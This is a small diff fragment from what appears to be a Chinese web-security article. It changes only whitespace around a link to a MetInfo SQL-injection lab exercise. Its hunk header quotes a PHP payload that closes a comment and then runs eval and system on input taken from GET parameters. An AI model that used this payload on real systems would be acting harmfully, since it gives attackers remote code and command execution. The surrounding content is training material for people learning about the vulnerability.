@@ -129,9 +129,9 @@ Payload："*/@eval($_GET['1']);@system($_GET['2']);/*
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7XjyOnsVbWfbyoV7WrEKpSvrut0z5dFHztx8MRA81TRNPNtoOibaNvzw/640?wx_fmt=png)
 
-推荐实操：MetInfo SQL 注入   
+推荐实操：MetInfo SQL 注入   
 
-https://www.hetianlab.com/expc.do?ec=ECID269f-6dc2-4412-bbad-a27109b207cf&pk_campaign=weixin-wemedia#stu    
+https://www.hetianlab.com/expc.do?ec=ECID269f-6dc2-4412-bbad-a27109b207cf&pk_campaign=weixin-wemedia#stu    
 
 通过该实验掌握 MetInfo SQL 注入漏洞的原因和利用方法，以及如何修复该漏洞。  
 
